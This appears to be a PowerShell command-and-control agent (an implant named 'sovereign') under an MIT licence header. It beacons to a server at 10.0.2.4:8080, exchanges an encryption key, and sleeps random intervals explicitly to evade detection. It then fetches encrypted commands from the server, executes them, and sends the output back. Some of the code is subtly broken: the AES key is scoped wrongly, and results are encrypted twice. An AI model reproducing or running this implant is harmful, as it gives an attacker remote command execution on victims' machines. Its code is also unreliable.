########################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################

# Configuration
$server_url = "http://10.0.2.4:8080"
$results_url = "$server_url/result"
Write-Host "Results URL: $results_url"
$sovereign_folder = "C:\sovereign"
$agent_id_file = "$sovereign_folder\agent_id.txt"
$log_file = "$sovereign_folder\agent_log.txt"
$public_key_url = "$server_url/public_key"
$checkin_url = "$server_url/checkin"
$exchange_key_url = "$server_url/exchange_key"
$send_command_url = "$server_url/send_command"

# Create the 'sovereign' folder if it doesn't exist
if (-Not (Test-Path -Path $sovereign_folder)) {
    New-Item -ItemType Directory -Path $sovereign_folder | Out-Null
    Write-Host "Created folder: $sovereign_folder" | Out-File -FilePath $log_file -Append
}

# Generate a unique agent ID and store it in the 'agent_id.txt' file if it doesn't exist
if (-Not (Test-Path -Path $agent_id_file)) {
    $agent_id = [guid]::NewGuid().ToString()
    $agent_id | Out-File -FilePath $agent_id_file
    Write-Host "Generated and stored Agent ID: $agent_id" | Out-File -FilePath $log_file -Append
} else {
    $agent_id = Get-Content -Path $agent_id_file
    Write-Host "Loaded Agent ID from file: $agent_id" | Out-File -FilePath $log_file -Append
}

# Print the agent ID to verify
Write-Host "Agent ID: $agent_id"

# Variables to store AES Key and HMAC Key
$aes_key = $null
$evade_interval_min = 60   # Minimum sleep time (in seconds)
$evade_interval_max = 300  # Maximum sleep time (in seconds)

# Logging function
function Log-Message {
    param (
        [string]$message
    )
    Write-Host $message
    $message | Out-File -FilePath $log_file -Append
}

# Get the RSA Public Key from the server
function Get-PublicKey {
    $public_key_response = Invoke-RestMethod -Uri $public_key_url -Method Get
    return $public_key_response.PublicKey
}

# Check in with the server
function Checkin {
    try {
        $response = Invoke-RestMethod -Uri $checkin_url -Method Post -Body (@{AgentID = $agent_id} | ConvertTo-Json) -ContentType "application/json"
        Log-Message "Checkin Response: $($response.Status)"
    } catch {
        Log-Message "Error during check-in: $_"
    }
}

# Exchange AES key with the server
function ExchangeKey {
    try {
        # Encrypt the AES key using RSA public key
        $public_key = Get-PublicKey
        $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new()
        $rsa.FromXmlString($public_key)

        # Generate a random 32-byte AES key
        $aes_key_bytes = New-Object byte[] 32
        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($aes_key_bytes)

        # Encrypt AES key with RSA
        $encrypted_aes_key = $rsa.Encrypt($aes_key_bytes, $true)
        $encrypted_aes_key_base64 = [Convert]::ToBase64String($encrypted_aes_key)

        # Send encrypted AES key to the server
        $response = Invoke-RestMethod -Uri $exchange_key_url -Method Post -Body (@{AgentID = $agent_id; EncAESKey = $encrypted_aes_key_base64} | ConvertTo-Json) -ContentType "application/json"
        Log-Message "Key Exchange Response: $($response.Status)"

        # Store the AES key for further use
        $aes_key = $aes_key_bytes

        # Dispose of RSA resource
        $rsa.Dispose()
    } catch {
        Log-Message "Error during key exchange: $_"
        # Retry key exchange
        ExchangeKey
    }
}

# Encrypt data with AES (AES-GCM mode)
function Encrypt-Data {
    param (
        [string]$data
    )
    # Check if aes_key is set
    if ($null -eq $aes_key) {
        Log-Message "AES Key is not set. Exiting encryption process."
        return
    }
    
    $aes = [System.Security.Cryptography.AesGcm]::new($aes_key)
    $nonce = New-Object byte[] 12
    (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($nonce)

    $plaintext = [System.Text.Encoding]::UTF8.GetBytes($data)
    $ciphertext = New-Object byte[] $plaintext.Length
    $tag = New-Object byte[] 16

    $aes.Encrypt($nonce, $plaintext, $ciphertext, $tag)
    
    $encrypted_data = [Convert]::ToBase64String($nonce + $ciphertext + $tag)

    # Dispose of AES resource
    $aes.Dispose()

    return $encrypted_data
}

# Decrypt data with AES (AES-GCM mode)
function Decrypt-Data {
    param (
        [string]$encrypted_data_base64
    )
    # Check if aes_key is set
    if ($null -eq $aes_key) {
        Log-Message "AES Key is not set. Exiting decryption process."
        return
    }
    
    $encrypted_data = [Convert]::FromBase64String($encrypted_data_base64)
    
    $nonce = $encrypted_data[0..11]
    $ciphertext = $encrypted_data[12..($encrypted_data.Length - 17)]
    $tag = $encrypted_data[($encrypted_data.Length - 16)..($encrypted_data.Length - 1)]

    $aes = [System.Security.Cryptography.AesGcm]::new($aes_key)
    $plaintext = New-Object byte[] $ciphertext.Length
    $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)

    $decrypted_data = [System.Text.Encoding]::UTF8.GetString($plaintext)

    # Dispose of AES resource
    $aes.Dispose()

    return $decrypted_data
}

# Execute command received from the server
function Execute-Command {
    param (
        [string]$command
    )
    try {
        $output = & $command 2>&1
    } catch {
        Log-Message "Command execution error: $_"
        return
    }

    # Encrypt the result
    $encrypted_result = Encrypt-Data -data $output

    # Send the result
    Send-Result -AgentID $agent_id -Output $encrypted_result
}

function Send-Result {
    param (
        [string]$AgentID,
        [string]$Output
    )

    # Debugging: Check if $ResultsURL is set correctly
    Write-Host "Sending result to: $ResultsURL"

    # Debugging: Check if $AgentID exists
    Write-Host "Agent ID: $AgentID"

    # Encrypt the result before sending
    $EncryptedResult = Encrypt-Data -data $Output

    # Define the results URL (keeping `/result` as per your agent config)
    $ResultsURL = "$server_url/result"

    # Prepare the payload
    $Payload = @{
        AgentID = $AgentID
        Result  = $EncryptedResult
    } | ConvertTo-Json -Depth 2

    # Debugging: Verify the JSON payload
    Write-Host "Payload: $Payload"

    try {
        # Send the encrypted result to the server
        $ResultResponse = Invoke-RestMethod -Uri $ResultsURL -Method Post -Body $Payload -ContentType "application/json"
        Log-Message "Result Sent: $($ResultResponse.Status)"
    } catch {
        Log-Message "Error sending result: $_"
    }
}

# Main loop to poll for commands
function MainLoop {
    while ($true) {
        try {
            # Periodically check-in with the server (beacon)
            Checkin

            # Sleep for a randomized interval to evade detection
            $sleep_time = Get-Random -Minimum $evade_interval_min -Maximum $evade_interval_max
            Log-Message "Sleeping for $sleep_time seconds to evade detection..."
            Start-Sleep -Seconds $sleep_time

            # Poll for commands from the server
            $command_response = Invoke-RestMethod -Uri $send_command_url -Method Post -Body (@{AgentID = $agent_id} | ConvertTo-Json) -ContentType "application/json"
            if ($command_response.data) {
                $decrypted_command = Decrypt-Data -encrypted_data_base64 $command_response.data
                Log-Message "Executing command: $decrypted_command"
                Execute-Command -command $decrypted_command
            }
        } catch {
            Log-Message "Error: $_"
        }
    }
}

# Main script execution
Checkin
ExchangeKey
MainLoop
